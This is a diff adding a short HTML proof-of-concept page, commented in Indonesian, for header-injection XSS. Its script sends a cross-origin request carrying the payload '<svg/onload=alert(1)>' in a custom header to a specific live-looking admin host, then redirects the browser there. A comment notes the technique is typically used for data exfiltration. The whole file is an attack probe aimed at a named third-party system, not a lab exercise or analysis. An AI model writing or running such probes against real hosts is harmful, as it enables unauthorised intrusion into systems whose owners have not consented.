@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Header Injection PoC</title>
+</head>
+<body>
+    <h1>Membuat Permintaan dengan Header Berbahaya</h1>
+    <p>Periksa tab Network dan Console pada Developer Tools.</p>
+    
+    <script>
+      // Fungsi ini akan dipanggil setelah permintaan selesai (req.onload)
+      function gotcha() {
+        // Dalam konteks PoC Anda, ini akan mengarahkan browser ke URL yang ditentukan
+        // dan biasanya digunakan untuk exfiltrasi data atau menunjukkan kesuksesan
+        location = url 
+      }
+      
+      var req = new XMLHttpRequest()
+      // GANTI 'https://example.com/' dengan URL Target API/Halaman yang Anda uji!
+      url = "https://mainadm.aov.garena.co.id" // Catatan: Berhati-hatilah dengan mixed content blocking
+      
+      req.onload = gotcha
+      req.open("get", url, true)
+      
+      // KUNCI: Header yang mengandung payload XSS
+      // Jika server target merespons dengan mengembalikan header ini di respons
+      // (misalnya, di header debugging) tanpa encoding, maka XSS dapat terjadi.
+      req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
+      
+      req.send()
+    </script>
+</body>
+</html>
